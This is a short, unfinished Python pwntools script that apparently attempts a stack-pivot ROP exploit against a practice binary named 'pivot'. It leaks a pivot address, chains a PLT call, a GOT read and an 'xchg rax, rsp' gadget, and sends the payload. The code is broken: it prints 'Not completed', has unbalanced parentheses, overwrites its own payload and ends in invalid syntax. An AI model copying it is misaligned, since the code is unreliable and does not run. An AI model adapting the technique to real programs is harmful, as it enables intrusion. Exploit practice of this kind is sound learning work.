#!/usr/bin/python3
from pwn import *
context.binary = './pivot'
libc = ELF('libpivot.so')
e = ELF('pivot')
r = ROP(e)
# we can only fit 24 bytes on the stack
# after the second read
# add libc offset
# 0x4009bd: xchg rax, rsp; ret;
# ret2win = 0x7fbc3260f000 + libc.sym['ret2win']
print("Not completed")
p = process('./pivot')
p.recvuntil(': ')
pivot_location = int(p.recvline().strip(), 16)
log.info("pivot is @ "+hex(pivot_location))
# call the foothold_function to populate the .got.plt entry
payload = p64(e.sym.plt['foothold_function'])
payload += p64(r.find_gadget(['pop rax', 'ret']).address))
payload += p64(e.sym.got['foothold_function'])
payload += p64(0x4009c0) # mov rax, qword ptr [rax] ; ret
payload += p64(r.find_gadget(["pop rbp", "ret"]))
# place value to pivot to into rax and swap rax with rsp
payload = p64(r.find_gadget(['pop rax', 'ret']).address))
payload += p64(pivot_location)
payload += p64(0x4009bd)
p.sendline(fit(40:r.chain()))
